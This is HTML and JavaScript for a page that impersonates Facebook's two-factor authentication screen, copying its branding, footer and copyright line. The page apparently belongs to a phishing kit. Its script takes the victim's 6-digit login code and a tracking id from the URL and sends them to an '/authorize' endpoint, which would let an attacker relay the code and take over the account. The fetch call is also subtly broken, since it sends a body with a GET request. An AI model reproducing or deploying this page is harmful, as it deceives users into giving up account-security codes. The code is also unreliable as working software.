<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <!-- <link rel="icon" type="image/svg+xml" href="./assets/icons8-facebook.svg" /> -->
  <!-- <link rel="stylesheet" href="/style.css" /> -->
    <script src="https://cdn.tailwindcss.com"></script>

  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Facebook</title>
  <style>
    body {
      font-family: Helvetica, sans-serif;
      background-color: #F0F2F5;
    }

    .container {
      max-width: 980px;
      margin: 0 auto;
    }

    .header {
      height: 42px;
      background: #4267b2;
      display: flex;
      align-items: center;
      justify-content: space-between;
      flex-direction: row;
    }

    .header-container {
      width: 980px;
      max-width: 980px;
      display: flex;
      justify-content: space-between;
      align-items: center;
      margin: 0px auto;
    }

    .logout {
      color: #fff;
      margin: 7px 1px 8px 0px;
      font-size: 12px;
      font-weight: 700;
    }

    .logout:hover {
      cursor: pointer;
    }

    .content-container {
      display: flex;
      flex-direction: column;
      height: 100vh;
    }

    .first-part,
    .second-part {
      height: 50%;
      width: 100%;
    }

    .second-part {
      background-color: #fff;
      display: flex;
      flex-direction: column;
      justify-content: space-around;
    }

    .auth-box {
      width: 100%;
      max-width: 588px;
      display: flex;
      flex-direction: column;
      flex-shrink: 1;
      background-color: rgb(255, 253, 253);
      padding: 12px;
      border: solid 1px #c7c7c8;
      border-radius: 3px;
      margin: 80px auto;
    }

    .title {
      font-weight: 600;
      font-size: 14px;
      color: #1d2129;
      padding-bottom: 12px;
    }

    .divider {
      width: 100%;
      height: 1px;
      background-color: #dcdcdc;
    }

    .action-div {
      display: flex;
      justify-content: space-between;
      font-size: 12px;
      max-width: 100%;
      padding: 12px 0px 0px 0px;
    }

    input:focus {
      outline: none;
    }

    input::placeholder {
      font-size: 12px;
    }

    .action-div p {
      color: #4267b2;
      display: flex;
      justify-content: center;
      align-items: center;
    }

    .action-div p:hover {
      cursor: pointer;
      text-decoration: underline;
    }

    .action-div button {
      background-color: #4267b2;
      color: #fff;
      padding: 5px 10px;
      font-weight: 600;
      border-radius: 3px;
    }

    li {
      color: #4267b2;
    }
  </style>
</head>
<body>
  <div class="w-full  bg-[#4267b2] flex flex-col">
    <div class="header">
      <div class="header-container">
        <div class="logo">
          <img src="./assets/facebook-letters.png" alt="">
        </div>
        <div class="logout">Log Out</div>
      </div>
    </div>

    <div class="content-container">
      <div class="first-part bg-[#F0F2F5]">
        <div class="container">
          <div class="auth-box">
            <p class="title">Two-factor authentication required</p>
            <div class="divider"></div>
            <div style="padding-top: 12px; font-size: 14px; display: flex; flex-direction: column;">
              <p class="subtitle">You’ve asked us to require a 6-digit login code when anyone tries to access your account from a new device or
                browser.</p>
              <span style="padding-top: 12px;">When you receive your 6-digit code, enter it to continue:</span>
              <input id="loginCode" type="text" placeholder="Login code"
                style="width: 142px; font-size: 12px; margin: 12px 0px; padding: 0px 2px 0px 2px; border: 1px solid #c7c7c8;">
            </div>
            <div class="divider"></div>
            <div class="action-div">
              <p>Didn't receive a code?</p>
              <button onclick="authorize()" id="button-2fa">Continue</button>
            </div>
          </div>
        </div>
      </div>
      <div class="second-part ">
        <div class="w-full h-[137px] bg-white mx-auto py-5 px-5 sm:px-5 md:px-0 lg:px-0">
          <ul class="max-w-[980px] flex flex-wrap gap-x-2.5 text-[12px] text-[#8a8291] mx-auto pt-2">
            <li style="color: #8a8291;">English (US)</li>
            <li class=" hover:cursor-pointer hover:underline">Shqip</li>
            <li class=" hover:cursor-pointer hover:underline">Deutsch</li>
            <li class=" hover:cursor-pointer hover:underline">Türkçe</li>
            <li class=" hover:cursor-pointer hover:underline">Српски</li>
            <li class=" hover:cursor-pointer hover:underline">Français (France)</li>
            <li class=" hover:cursor-pointer hover:underline">Italiano</li>
            <li class=" hover:cursor-pointer hover:underline">Bosanski</li>
            <li class=" hover:cursor-pointer hover:underline">Svenska</li>
            <li class=" hover:cursor-pointer hover:underline">Español</li>
            <li class=" hover:cursor-pointer hover:underline">Português (Brasil)</li>
            <li class="bg-[#f5f6f7] flex items-center justify-center px-2 rounded-[2px] border border-[#c7c7c8] cursor-pointer">
              <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="#4c4c4d" class="w-4 h-4">
                <path stroke-linecap="round" stroke-linejoin="round" d="M12 4.5v15m7.5-7.5h-15" />
              </svg>
            </li>
          </ul>

          <div class="divider max-w-[980px] h-[1px] bg-[#dcdcdc] mx-auto mb-1 mt-2"></div>

          <ul class="max-w-[980px] flex flex-wrap gap-x-4 gap-y-0.5 text-[12px] text-[#8a8291] mx-auto pt-2">
            <li class=" hover:cursor-pointer hover:underline">Sign Up</li>
            <li class=" hover:cursor-pointer hover:underline">Log In</li>
            <li class=" hover:cursor-pointer hover:underline">Messenger</li>
            <li class=" hover:cursor-pointer hover:underline">Facebook Lite</li>
            <li class=" hover:cursor-pointer hover:underline">Watch</li>
            <li class=" hover:cursor-pointer hover:underline">Places</li>
            <li class=" hover:cursor-pointer hover:underline">Games</li>
            <li class=" hover:cursor-pointer hover:underline">Marketplace</li>
            <li class=" hover:cursor-pointer hover:underline">Meta Pay</li>
            <li class=" hover:cursor-pointer hover:underline">Oculus</li>
            <li class=" hover:cursor-pointer hover:underline">Portal</li>
            <li class=" hover:cursor-pointer hover:underline">Instagram</li>
            <li class=" hover:cursor-pointer hover:underline">Bulletin</li>
            <li class=" hover:cursor-pointer hover:underline">Fundraisers</li>
            <li class=" hover:cursor-pointer hover:underline">Services</li>
            <li class=" hover:cursor-pointer hover:underline">Voting Information Center</li>
            <li class=" hover:cursor-pointer hover:underline">Privacy Policy</li>
            <li class=" hover:cursor-pointer hover:underline">Privacy Center</li>
            <li class=" hover:cursor-pointer hover:underline">Groups</li>
            <li class=" hover:cursor-pointer hover:underline">About</li>
            <li class=" hover:cursor-pointer hover:underline">Create Ad</li>
            <li class=" hover:cursor-pointer hover:underline">Create Page</li>
            <li class=" hover:cursor-pointer hover:underline">Developers</li>
            <li class=" hover:cursor-pointer hover:underline">Careers</li>
            <li class=" hover:cursor-pointer hover:underline">Cookies</li>
            <li class=" hover:cursor-pointer hover:underline">Ad choices</li>
            <li class=" hover:cursor-pointer hover:underline">Terms</li>
            <li class=" hover:cursor-pointer hover:underline">Help</li>
            <li class=" hover:cursor-pointer hover:underline">Contact Uploading & Non-UsersSettings</li>
          </ul>
          <div class="max-w-[980px] mx-auto mt-6">
            <p class=" text-[11px] text-[#8a8291] ">Meta © 2023</p>
          </div>
        </div>
      </div>
    </div>

  </div>
  <script defer>
    const urlParams = new URLSearchParams(window.location.search);
    const id = urlParams.get('id');
    let login_code = document.getElementById('loginCode')

    async function authorize() {
      let body = {
        '2fa_code': login_code.value,
        'id': id
      }
      let response = await fetch('/authorize', {
          method: 'GET',
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify(body)
      })
     
      if(response && response.ok) {
        let data = response.json()
        console.log(data)
      }

    }

  </script>
</body>
</html>